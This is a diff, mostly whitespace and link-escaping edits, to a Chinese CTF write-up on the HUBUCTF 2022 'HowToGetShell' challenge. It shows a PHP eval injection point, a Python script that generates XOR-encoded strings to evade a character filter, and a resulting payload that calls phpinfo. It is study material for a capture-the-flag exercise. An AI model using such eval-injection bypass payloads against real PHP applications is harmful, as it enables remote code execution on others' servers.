@@ -1,4 +1,5 @@
-#RCE 
+#RCE
+
 ```php
 <?php
 show_source(__FILE__);
@@ -12,11 +13,12 @@ eval($mess);
 这个题取反不知为何我这里没反应
 
 #### 异或
+
 ```php
 valid = "1234567890!@$%^*(){}[];\'\",.<>/?-=_`~ "
- 
+
 answer = "phpinfo"
- 
+
 tmp1,tmp2 = '',''
 for c in answer:
     for i in valid:
@@ -31,8 +33,9 @@ for c in answer:
 print(tmp1,tmp2)
 // mess=$_="0302181"^"@[@[_^^";$_();
 ```
+
 参考
 
-[[HUBUCTF 2022 新生赛]_S@Kura的博客-CSDN博客](https://blog.csdn.net/zhhhb1005/article/details/127035837)
+[[HUBUCTF 2022 新生赛]\_S@Kura 的博客-CSDN 博客](https://blog.csdn.net/zhhhb1005/article/details/127035837)
 
-[[HUBUCTF 2022 新生赛]HowToGetShell题解_dockerere的博客-CSDN博客](https://blog.csdn.net/qq_64222098/article/details/132162902)
+[[HUBUCTF 2022 新生赛]HowToGetShell 题解\_dockerere 的博客-CSDN 博客](https://blog.csdn.net/qq_64222098/article/details/132162902)
